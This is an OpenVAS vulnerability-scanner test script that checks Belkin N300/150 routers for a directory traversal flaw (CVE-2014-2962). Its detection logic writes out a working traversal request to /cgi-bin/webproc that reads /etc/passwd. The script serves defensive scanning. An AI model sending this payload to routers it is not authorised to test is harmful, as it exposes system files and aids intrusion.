###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_belkin_router_dir_trav_vuln.nasl 6254 2017-05-31 09:04:18Z teissa $
#
# Belkin Router Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806147");
  script_version("$Revision: 6254 $");
  script_cve_id("CVE-2014-2962");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-05-31 11:04:18 +0200 (Wed, 31 May 2017) $");
  script_tag(name:"creation_date", value:"2015-10-29 12:12:25 +0530 (Thu, 29 Oct 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Belkin Router Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is running Belkin Router and is
  prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read the configuration file or not.");

  script_tag(name:"insight", value:"The flaw allows unauthenticated attackers
  to download arbitrary files through directory traversal.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to read arbitrary files on the target system

  Impact Level: Application");

  script_tag(name:"affected", value:"
  Belkin N300/150 WiFi N Router, other firmware may also be affected.");

  script_tag(name: "solution" , value:"As a workaround ensure that appropriate
  firewall rules are in place to restrict access to port 80/tcp from external
  untrusted sources.
  For more information refer to http://www.belkin.com");

  script_tag(name:"solution_type",value:"Workaround");

  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/774788");
  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/38488");
  script_xref(name : "URL" , value : "http://www.belkin.com/us/support-article?articleNum=109400");
  script_xref(name : "URL" , value : "https://packetstormsecurity.com/files/133913/belkin-disclose.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("mini_httpd/banner");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
asport = "";
banner = "";

## Get HTTP Port
asport = get_http_port(default:80);
if(!asport){
  exit(0);
}

##Get banner
banner = get_http_banner(port: asport);
if(!banner){
  exit(0);
}

## Confirm the device from banner
if(banner =~ 'Server: mini_httpd')
{
  ## Exploit URL
  url = "/cgi-bin/webproc?getpage=../../../../../../../../../../etc/passwd&" +
      "var:getpage=html/index.html&var:language=en_us&var:oldpage=(null)&" +
      "var:page=login";

  ## Confirm the exploit
  if(http_vuln_check(port:asport, url:url, pattern:"root:.*:0:[01]:"))
  {
    report = report_vuln_url( port:asport, url:url );
    security_message(port:asport, data:report);
    exit(0);
  }
}
